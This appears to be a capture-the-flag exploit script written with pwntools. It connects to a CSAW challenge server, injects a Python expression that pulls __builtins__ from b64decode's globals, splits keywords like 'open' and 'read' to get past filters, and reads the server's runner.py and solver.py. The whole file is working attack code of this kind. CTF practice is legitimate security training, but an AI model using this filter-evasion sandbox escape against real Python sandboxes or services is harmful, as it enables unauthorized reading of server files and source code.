from pwn import *
context.log_level='error'
HOST='pwn.chal.csaw.io'; PORT=8000

def run(cmd):
    io=remote(HOST,PORT)
    io.recvuntil(b'>>> ')
    io.sendline(cmd.encode())
    data=b''
    try:
        data=io.recvuntil(b'>>> ', timeout=2)
    except Exception:
        try:
            data += io.recvall(timeout=1)
        except Exception:
            pass
    io.close()
    return data.decode('latin1','replace')

for f in ['runner.py','solver.py']:
    cmd = "B=getattr(b64decode,'_'*2+'globals'+'_'*2)['_'*2+'builtins'+'_'*2];F=B['o'+'pen']('"+f+"');print(repr(getattr(F,'re'+'ad')()))"
    print('FILE', f)
    print(run(cmd))
    print('---')
